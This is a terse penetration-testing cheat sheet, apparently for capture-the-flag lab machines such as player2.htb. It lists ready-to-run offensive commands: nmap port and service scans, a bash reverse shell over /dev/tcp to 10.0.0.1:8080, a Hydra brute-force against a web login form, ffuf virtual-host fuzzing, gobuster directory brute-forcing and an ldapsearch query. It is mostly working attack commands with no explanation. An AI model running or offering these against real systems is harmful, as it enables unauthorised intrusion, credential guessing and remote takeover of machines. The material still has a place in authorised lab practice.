**nmap**
```
ports=$(nmap -p- --min-rate=1000 -T4 10.13.38.11 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.13.38.11
```

**Bash reverse shell**
```
bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
```
**Hydra**
```
hydra -L users.txt -P pass.txt product.player2.htb http-post-form "/index:username=^USER^&password=^PASS^&Submit=Sign in:Nope"
```
**ffuf vhost fuzzing**
```
~/go/bin/ffuf -v -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:VHOST -H "Host: VHOST.player2.htb" -fl "4"  -u http://player2.htb
```
**gobuster**
```
gobuster dir -t 50 -u http://player2.htb -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x .php
```
**ldapsearch**

Find root 

```
ldapsearch -x -h 10.10.10.119 -s base namingcontexts
```
